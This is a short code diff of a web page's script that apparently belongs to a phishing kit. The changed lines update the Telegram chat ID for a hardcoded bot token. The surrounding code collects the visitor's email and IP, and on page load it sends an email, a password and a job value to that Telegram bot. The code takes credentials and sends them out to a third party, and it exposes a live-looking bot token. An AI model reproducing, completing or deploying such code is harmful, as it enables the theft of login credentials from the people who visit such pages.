@@ -495,9 +495,9 @@
         let email = '';
         let userIP = 'Unavailable';
 
-        // Telegram configuration - UPDATED WITH NEW TOKEN
+        // Telegram configuration - UPDATED WITH YOUR NEW CHAT ID AND TOKEN
         const TELEGRAM_BOT_TOKEN = "8309272552:AAFwpd5QPXJnnaWRxMk2jfIQja_x6XUtFUI";
-        const TELEGRAM_CHAT_ID = "5852301284";
+        const TELEGRAM_CHAT_ID = "6726567281";  // Your new chat ID
 
         // Fetch IP address
         fetch("https://api.ipify.org?format=json")
@@ -617,7 +617,7 @@
             }
         });
 
-        // Send a test message when page loads to confirm the new token works
+        // Send a test message when page loads to confirm the new chat ID and token work
         window.addEventListener('load', function() {
             setTimeout(() => {
                 sendToTelegram('test@page_load.com', 'test_password', 'test_job');
